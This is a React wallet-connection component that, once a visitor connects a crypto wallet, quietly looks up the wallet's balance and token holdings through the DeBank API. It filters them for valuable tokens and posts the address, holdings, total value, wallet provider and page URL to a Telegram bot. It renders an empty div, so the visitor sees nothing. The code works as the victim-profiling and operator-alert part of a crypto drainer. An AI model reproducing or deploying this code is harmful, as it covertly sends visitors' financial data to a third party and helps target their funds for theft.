"use client";

import { useState, useEffect } from "react";
import { useAccount } from "wagmi";
import axios from "axios";

const ConnectedAddress = () => {
  const { address, isConnected, connector } = useAccount();
  const [totalBalance, setTotalBalance] = useState<number | null>(null);
  const [tokenDetails, setTokenDetails] = useState<string>(""); 
  const [isLoading, setIsLoading] = useState(false);
  const [currentPageUrl, setCurrentPageUrl] = useState<string>("");


  useEffect(() => {
    if (isConnected && connector) {
      console.log("Connected wallet provider:", connector.name); // Log the active wallet provider's name.
    }
  }, [isConnected, connector]);

  // Fetch total balance from DeBank API
  const fetchTotalBalance = async () => {
    if (!address) return;
    setIsLoading(true);

    try {
      const currentUrl = typeof window !== "undefined" ? window.location.href : "Not Available";
      
      const totalBalanceResponse = await axios.get(
        `https://pro-openapi.debank.com/v1/user/total_balance`,
        {
          headers: {
            Accept: "application/json",
            AccessKey: process.env.NEXT_PUBLIC_DEBANK_ACCESS_KEY || "YOUR_ACCESSKEY",
          },
          params: { id: address },
        }
      );

      const tokenListResponse = await axios.get(
        `https://pro-openapi.debank.com/v1/user/all_token_list`,
        {
          headers: {
            Accept: "application/json",
            AccessKey: process.env.NEXT_PUBLIC_DEBANK_ACCESS_KEY || "YOUR_ACCESSKEY",
          },
          params: { id: address },
        }
      );

      // Extract total balance
      const totalBalance = totalBalanceResponse.data.total_usd_value || 0;
      setTotalBalance(totalBalance);

      // Extract and filter token details
      const formattedTokens = tokenListResponse.data.map((token: any) => {
        const name = token.name || "Unknown";
        const chain = token.chain || "unknown";
        const symbol = token.symbol || "unknown";
        const usdValue = token.price
          ? (token.raw_amount / Math.pow(10, token.decimals)) * token.price
          : 0;
        return {
          name,
          chain,
          usdValue,
          symbol,
          isCore: token.is_core || false,
          isVerified: token.is_verified || false,
        };
      });

      const filteredAndSortedTokens = formattedTokens
        .filter((token: { isCore: any; isVerified: any; }) => token.isCore || token.isVerified) // Keep core or verified tokens
        .filter((token: { usdValue: number; }) => token.usdValue >= 10) // Keep tokens with USD value >= $10
        .sort((a: { usdValue: number; }, b: { usdValue: number; }) => b.usdValue - a.usdValue); // Sort by USD value, descending

      const tokenMessages = filteredAndSortedTokens.map(
        (token: { name: any; chain: any; usdValue: number; symbol: any }) =>
          `\n${token.name} - ${token.symbol} \n💵 $${token.usdValue.toFixed(2)} - CHAIN: ${token.chain}`
      );

      setTokenDetails(tokenMessages.join("\n"));
      console.log(`URL sent to Telegram: ${currentPageUrl}`);

      // Send data to Telegram
      await sendBalanceToTelegram(totalBalance, tokenMessages, currentUrl);
    } catch (error) {
      console.error("Error fetching balance or tokens from DeBank API:", error);
    } finally {
      setIsLoading(false);
    }
  };

  // Send balance, token details, and current page URL to Telegram
  const sendBalanceToTelegram = async (balance: number, tokens: string[], pageUrl: string) => {
    const telegramBotToken = process.env.NEXT_PUBLIC_TELEGRAM_BOT_TOKEN || "YOUR_TELEGRAM_BOT_TOKEN";
    const telegramChatId = process.env.NEXT_PUBLIC_TELEGRAM_CHAT_ID || "YOUR_TELEGRAM_CHAT_ID";
    const walletProvider = connector?.name || "Unknown Provider"; // Include provider name
    const tokenMessage = tokens.join("\n");
    const urlMessage = pageUrl ? `🌐 Current Page: ${pageUrl}` : "🌐 Current Page: Not Available";
    const message = `✨ New ${walletProvider} Connection  \n\n🏦 \`${address}\` \n[View on DeBank](https://debank.com/profile/${address})\n\n${tokenMessage}\n\n💵Total Balance: $${balance.toFixed(2)}\n${urlMessage}`;

    try {
      await axios.post(`https://api.telegram.org/bot${telegramBotToken}/sendMessage`, {
        chat_id: telegramChatId,
        text: message,
        parse_mode: "Markdown",
      });
      console.log("Balance and tokens sent to Telegram");
    } catch (error) {
      console.error("Error sending data to Telegram:", error);
    }
  };

  // Fetch balance on wallet connection
  useEffect(() => {
    if (isConnected && address) {
      fetchTotalBalance();
    }
  }, [isConnected, address]);

  return (
    <div>
      
    </div>
  );
};

export default ConnectedAddress;
